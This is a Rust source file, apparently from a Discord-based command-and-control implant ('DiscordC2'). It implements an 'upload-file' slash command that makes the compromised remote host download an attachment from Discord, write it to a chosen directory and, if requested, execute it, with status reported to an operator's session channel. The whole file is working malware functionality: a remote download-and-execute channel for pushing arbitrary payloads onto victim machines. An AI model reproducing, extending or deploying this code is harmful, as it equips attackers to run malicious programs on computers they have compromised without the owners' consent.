use std::{
	path::{Path, PathBuf},
	process::Stdio,
};

use serenity::{
	builder::CreateApplicationCommand,
	model::{
		application::command::CommandOptionType,
		prelude::interaction::application_command::{
			ApplicationCommandInteraction,
			CommandDataOption,
			CommandDataOptionValue,
		},
	},
	prelude::Context,
};
use tokio::{fs::File, io::AsyncWriteExt, process::Command};
use tracing::{error, info as informational};

use super::session::SHELL_TYPE;
use crate::{
	discord_utils::bot_functions::{
		send_channel_message,
		send_edit_response,
		send_interaction_response,
	},
	errors::DiscordC2Error,
	os::process_handler::ProcessHandler,
	utils::agent::get_or_create_agent,
};

pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
	let command = command
		.name("upload-file")
		.description("Uploads a file to the remote host.")
		.create_option(|option| {
			option
				.name("path")
				.kind(CommandOptionType::String)
				.description(r"The directory to upload the file to (omit the file name). '\' will deploy to the relative directory.")
				.required(true)
		})
		.create_option(|option| {
			option
				.name("attachment")
				.kind(CommandOptionType::Attachment)
				.description("The attachment you would like to upload to the remote host.")
				.required(true)
		})
		.create_option(|option| {
			option
				.name("execute")
				.kind(CommandOptionType::Boolean)
				.description("Whether or not this file should be executed on upload. (False by default)")
				.add_string_choice("Execute", true)
				.add_string_choice("Don't Execute", false)
		});
	command
}

pub async fn run(options: &[CommandDataOption], ctx: &Context) -> Result<String, DiscordC2Error> {
	let options = options.to_owned();

	let file_path = options
		.get(0)
		.ok_or(DiscordC2Error::InternalError(
			"Expected option at index 0".to_string(),
		))?
		.resolved
		.as_ref()
		.ok_or(DiscordC2Error::InternalError(
			"Expected file path in options".to_string(),
		))?;

	let attachment = options
		.get(1)
		.ok_or(DiscordC2Error::InternalError(
			"Expected option at index 1".to_string(),
		))?
		.resolved
		.as_ref()
		.ok_or(DiscordC2Error::InternalError(
			"Expected attachment in options".to_string(),
		))?;

	let execute = options
		.get(2)
		.and_then(|execute| execute.resolved.as_ref())
		.unwrap_or(&CommandDataOptionValue::Boolean(false));

	if let CommandDataOptionValue::String(file_path) = file_path {
		let file_path = path_validator(file_path).await?; // Validate the path

		if let CommandDataOptionValue::Attachment(attachment) = attachment {
			if let CommandDataOptionValue::Boolean(execute) = execute {
				request_handler(
					file_path,
					attachment.url.to_owned(),
					attachment.filename.to_owned(),
					*execute,
					ctx,
				)
				.await?;
			}
		}
	}

	Ok("Uploaded file to discord's servers successfully".to_string())
}

async fn path_validator(file_path: &str) -> Result<PathBuf, DiscordC2Error> {
	let shell_type = SHELL_TYPE.lock().await;
	let process_handler = match shell_type.as_ref() {
		Some(shell_type) => ProcessHandler::instance(shell_type).await,
		None => Err(DiscordC2Error::InvalidInput(
			"Shell type not found.".to_string(),
		)),
	}?;

	// Should return a DiscordC2Error::RegexError if not successful
	let directory = process_handler.current_working_directory().await?;

	// Path was relative
	if file_path == "\\" {
		Ok(Path::new(&directory).to_path_buf())
	}
	// Path is an absolute path and was found
	else if Path::new(file_path).exists() {
		Ok(Path::new(file_path).to_path_buf())
	}
	// Path was not found
	else {
		Err(DiscordC2Error::NotFound(file_path.to_string()))
	}
}

async fn request_handler(
	path: PathBuf,
	url: String,
	filename: String,
	execute: bool,
	ctx: &Context,
) -> Result<(), DiscordC2Error> {
	let response = reqwest::get(url)
		.await
		.map_err(|err| DiscordC2Error::LibraryError(err.to_string()))?;
	let bytes = response
		.bytes()
		.await
		.map_err(|err| DiscordC2Error::LibraryError(err.to_string()))?;

	let ctx = ctx.clone();

	tokio::spawn(async move {
		let agent = get_or_create_agent(&ctx).await;
		let session_channel = agent.get_session_channel().unwrap();

		async fn download_result(
			path: &Path,
			filename: String,
			bytes: &[u8],
		) -> Result<PathBuf, DiscordC2Error> {
			let final_path = path.join(filename);
			let mut file = File::create(path.join(&final_path)).await?;
			file.write_all(bytes).await?;
			file.sync_all().await?;
			Ok(final_path)
		}

		let final_path = match download_result(&path, filename, &bytes).await {
			Ok(path) => {
				informational!("File downloaded to the remote host successfully");
				if let Err(why) = send_channel_message(
					&ctx,
					session_channel,
					"File downloaded to the remote host successfully",
				)
				.await
				{
					error!("Couldn't send success message to the channel: {}", why);
				}
				Some(path)
			},
			Err(e) => {
				error!("Error downloading result: {}", e);
				if let Err(why) = send_channel_message(
					&ctx,
					session_channel,
					format!(
						"File was not downloaded to the remote host successfully: ```{}```",
						e
					),
				)
				.await
				{
					error!("Couldn't send failure message to the channel: {}", why);
				}
				None
			},
		};

		// Start the program
		if execute && final_path.is_some() {
			if let Some(final_path) = final_path {
				match Command::new(final_path)
					.stderr(Stdio::null())
					.stdin(Stdio::null())
					.stdout(Stdio::inherit())
					.spawn()
				{
					Ok(_) => {
						informational!("Executed file successfully");
						if let Err(why) = send_channel_message(
							&ctx,
							session_channel,
							"Executed the file successfully",
						)
						.await
						{
							error!("Couldn't send success message to the channel: {}", why);
						}
					},
					Err(e) => {
						error!("Error executing the file: {}", e);
						if let Err(why) = send_channel_message(
							&ctx,
							session_channel,
							format!(
								"File was not executed on the remote host successfully: ```{}```",
								e
							),
						)
						.await
						{
							error!("Couldn't send failure message to the channel: {}", why);
						}
					},
				};
			}
		}
	});

	Ok(())
}

pub async fn upload_handler(
	ctx: &Context,
	command: &ApplicationCommandInteraction,
) -> Result<(), DiscordC2Error> {
	let response = send_interaction_response(ctx, command, "Downloading file...", None).await?;
	let result = run(&command.data.options, ctx).await;

	match result {
		Ok(why) => {
			send_edit_response(ctx, &response, why).await?;
		},
		Err(why) => {
			send_edit_response(ctx, &response, why.to_string()).await?;
		},
	}

	Ok(())
}
